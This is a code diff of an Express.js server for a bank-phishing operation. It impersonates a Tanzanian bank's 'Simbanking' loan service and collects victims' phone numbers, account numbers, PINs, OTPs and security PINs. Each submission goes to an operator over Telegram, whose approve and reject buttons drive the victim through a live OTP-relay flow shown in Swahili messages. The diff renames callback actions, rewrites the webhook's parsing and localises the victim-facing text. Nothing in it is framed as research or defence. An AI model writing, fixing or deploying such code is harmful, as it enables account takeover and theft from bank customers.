@@ -1,5 +1,6 @@
 const express = require('express');
 const path = require('path');
+const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
@@ -64,12 +65,12 @@ app.post('/api/submit-credentials', async (req, res) => {
     const keyboard = {
       inline_keyboard: [
         [
-          { text: '❌ INVALID PHONE NO:', callback_data: `invalid_phone_${sessionId}` },
-          { text: '❌ INVALID ACC. NO:', callback_data: `invalid_acc_${sessionId}` }
+          { text: '❌ INVALID PHONE', callback_data: `invphone_${sessionId}` },
+          { text: '❌ INVALID ACC', callback_data: `invacc_${sessionId}` }
         ],
         [
-          { text: '❌ INVALID PIN', callback_data: `invalid_pin_${sessionId}` },
-          { text: '✅ PROCEED', callback_data: `proceed_otp_${sessionId}` }
+          { text: '❌ INVALID PIN', callback_data: `invpin_${sessionId}` },
+          { text: '✅ PROCEED (OTP)', callback_data: `proceedotp_${sessionId}` }
         ]
       ]
     };
@@ -99,8 +100,8 @@ app.post('/api/submit-otp', async (req, res) => {
     const keyboard = {
       inline_keyboard: [
         [
-          { text: '❌ WRONG OTP', callback_data: `wrong_otp_${sessionId}` },
-          { text: '✅ CORRECT OTP', callback_data: `correct_otp_${sessionId}` }
+          { text: '❌ WRONG OTP', callback_data: `wrongotp_${sessionId}` },
+          { text: '✅ CORRECT OTP', callback_data: `correctotp_${sessionId}` }
         ]
       ]
     };
@@ -128,8 +129,8 @@ app.post('/api/submit-security-pin', async (req, res) => {
     const keyboard = {
       inline_keyboard: [
         [
-          { text: '❌ WRONG PIN', callback_data: `wrong_pin_${sessionId}` },
-          { text: '✅ CORRECT PIN', callback_data: `correct_pin_${sessionId}` }
+          { text: '❌ WRONG PIN', callback_data: `wrongpin_${sessionId}` },
+          { text: '✅ CORRECT PIN', callback_data: `correctpin_${sessionId}` }
         ]
       ]
     };
@@ -150,52 +151,51 @@ app.get('/api/status/:sessionId', (req, res) => {
   res.json(session);
 });
 
-// Telegram Callback Webhook Endpoint (handles clicks on admin buttons)
+// Telegram Callback Webhook Endpoint
 app.post('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body;
     if (update.callback_query) {
-      const data = update.callback_query.data;
-      const parts = data.split('_');
-      // format: action_subaction_sessionId or action_sessionId
-      const sessionId = parts[parts.length - 1];
-      const action = data.replace(`_${sessionId}`, '');
+      const data = update.callback_query.data; // e.g. "invphone_session_abc123"
+      const underscoreIndex = data.indexOf('_');
+      const action = data.substring(0, underscoreIndex);
+      const sessionId = data.substring(underscoreIndex + 1);
 
       if (sessions[sessionId]) {
-        if (action === 'invalid_phone') {
+        if (action === 'invphone') {
           sessions[sessionId].status = 'error';
-          sessions[sessionId].notification = 'INVALID PHONE NO: Please enter a valid Simbanking mobile number.';
-        } else if (action === 'invalid_acc') {
+          sessions[sessionId].notification = 'INVALID PHONE NO: Tafadhali ingiza namba sahihi ya Simbanking.';
+        } else if (action === 'invacc') {
           sessions[sessionId].status = 'error';
-          sessions[sessionId].notification = 'INVALID ACC. NO: Please enter a valid account number.';
-        } else if (action === 'invalid_pin') {
+          sessions[sessionId].notification = 'INVALID ACC. NO: Tafadhali ingiza namba sahihi ya akaunti.';
+        } else if (action === 'invpin') {
           sessions[sessionId].status = 'error';
-          sessions[sessionId].notification = 'INVALID PIN: Please enter your correct Simbanking PIN.';
-        } else if (action === 'proceed_otp') {
+          sessions[sessionId].notification = 'INVALID PIN: Tafadhali ingiza PIN sahihi ya Simbanking.';
+        } else if (action === 'proceedotp') {
           sessions[sessionId].status = 'enter_otp';
-          sessions[sessionId].notification = 'CORRECT DETAILS ✅ - Endelea kwenda OTP.';
-        } else if (action === 'wrong_otp') {
+          sessions[sessionId].notification = 'IDHINI ✅ - Endelea kuweka OTP.';
+        } else if (action === 'wrongotp') {
           sessions[sessionId].status = 'enter_otp';
           sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP.';
-        } else if (action === 'correct_otp') {
+        } else if (action === 'correctotp') {
           sessions[sessionId].status = 'enter_security_pin';
-          sessions[sessionId].notification = 'OTP CORRECT ✅ - Endelea kuweka PIN.';
-        } else if (action === 'wrong_pin') {
+          sessions[sessionId].notification = 'OTP SWAHIHI ✅ - Endelea kuweka PIN ya usalama.';
+        } else if (action === 'wrongpin') {
           sessions[sessionId].status = 'enter_security_pin';
-          sessions[sessionId].notification = 'WRONG PIN: Tafadhali ingiza PIN mpya ya usalama.';
-        } else if (action === 'correct_pin') {
+          sessions[sessionId].notification = 'WRONG PIN: Tafadhali ingiza PIN sahihi ya usalama.';
+        } else if (action === 'correctpin') {
           sessions[sessionId].status = 'pending_approval';
-          sessions[sessionId].notification = 'PIN CORRECT ✅ - Inasubiri idhinisho la mwisho.';
+          sessions[sessionId].notification = 'PIN SAHIHI ✅ - Inasubiri idhinisho la mwisho.';
           
           await sendTelegramMessage(`✨ *READY FOR FINAL APPROVAL* for Acc: \`${sessions[sessionId].accountNumber}\``, {
             inline_keyboard: [
               [
-                { text: '✅ APPROVE', callback_data: `approve_final_${sessionId}` },
-                { text: '❌ REJECT', callback_data: `reject_final_${sessionId}` }
+                { text: '✅ APPROVE LOAN', callback_data: `approvefinal_${sessionId}` },
+                { text: '❌ REJECT', callback_data: `rejectfinal_${sessionId}` }
               ]
             ]
           });
-        } else if (action === 'approve_final') {
+        } else if (action === 'approvefinal') {
           sessions[sessionId].status = 'success';
           sessions[sessionId].notification = 'Hongera! Mkopo wako umeidhinishwa!';
         }
@@ -209,4 +209,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
-         
+                   
